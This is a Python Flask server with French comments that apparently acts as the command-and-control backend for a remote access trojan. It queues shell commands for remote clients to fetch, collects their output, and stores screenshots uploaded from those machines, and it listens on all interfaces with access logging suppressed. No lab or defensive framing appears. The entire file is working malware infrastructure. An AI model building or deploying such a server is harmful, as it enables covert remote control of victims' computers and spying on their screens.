from flask import Flask, request, jsonify
import logging
from datetime import datetime

app = Flask(__name__)

# Désactive les logs d'accès HTTP de Werkzeug
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # ou logging.CRITICAL pour encore moins

current_command = ""

@app.route('/get_command', methods=['GET'])
def get_command():
    global current_command
    cmd = current_command
    current_command = ""  # Reset after sending
    return jsonify({"command": cmd})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    output = data.get("output", "")
    print(f"\nOutput:\n{output}")
    return jsonify({"status": "received"})

@app.route('/set_command', methods=['POST'])
def set_command():
    global current_command
    data = request.json
    cmd = data.get("command", "")
    current_command = cmd
    return jsonify({"status": "command set"})

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    if 'screenshot' not in request.files:
        return "Pas de fichier screenshot", 400
    file = request.files['screenshot']
    formated_date = datetime.now().strftime("%d%m%y_%H%M%S")
    filename = f"capture_{formated_date}.png"
    file.save(f"captures\\{filename}")
    print(f"Screenshot reçu et sauvegardé sous {filename}")
    return "Screenshot reçu", 200

if __name__ == '__main__':
    # Optionnel : désactive aussi le debug Flask pour moins de logs
    app.run(host='0.0.0.0', port=5000, debug=False)